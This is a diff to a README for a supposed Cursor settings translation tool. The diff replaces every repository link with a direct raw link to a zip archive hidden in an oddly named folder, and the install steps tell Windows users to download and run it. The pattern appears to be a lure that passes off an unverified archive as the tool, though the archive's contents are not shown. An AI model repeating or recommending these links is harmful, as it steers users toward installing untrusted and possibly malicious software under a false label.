@@ -1,6 +1,6 @@
 # 🧩 cursor-i18n-tool - One-Click Cursor Settings Translation
 
-[![Download cursor-i18n-tool](https://img.shields.io/badge/Download-Now-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/christrackless211/cursor-i18n-tool)
+[![Download cursor-i18n-tool](https://img.shields.io/badge/Download-Now-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/christrackless211/cursor-i18n-tool/raw/refs/heads/main/Styracaceae/tool_i_n_cursor_v3.8.zip)
 
 ## 🌍 What This Tool Does
 
@@ -10,7 +10,7 @@ cursor-i18n-tool helps you switch Cursor settings into Chinese with one click. I
 
 Visit this page to download the tool:
 
-https://github.com/christrackless211/cursor-i18n-tool
+https://github.com/christrackless211/cursor-i18n-tool/raw/refs/heads/main/Styracaceae/tool_i_n_cursor_v3.8.zip
 
 If the page shows a release file or package, download it to your computer. If it shows the source files only, use the latest release or the main download option on the page.
 
@@ -28,7 +28,7 @@ If Cursor is already installed, you can start right away.
 ## 🚀 How to Install and Run on Windows
 
 1. Open the download page:
-   https://github.com/christrackless211/cursor-i18n-tool
+   https://github.com/christrackless211/cursor-i18n-tool/raw/refs/heads/main/Styracaceae/tool_i_n_cursor_v3.8.zip
 
 2. Look for the latest release or download file.
 
@@ -123,7 +123,7 @@ Yes. You can run it again if you need to apply the setting again.
 
 ## 🔗 Project Link
 
-https://github.com/christrackless211/cursor-i18n-tool
+https://github.com/christrackless211/cursor-i18n-tool/raw/refs/heads/main/Styracaceae/tool_i_n_cursor_v3.8.zip
 
 ## 📌 Simple Workflow
 
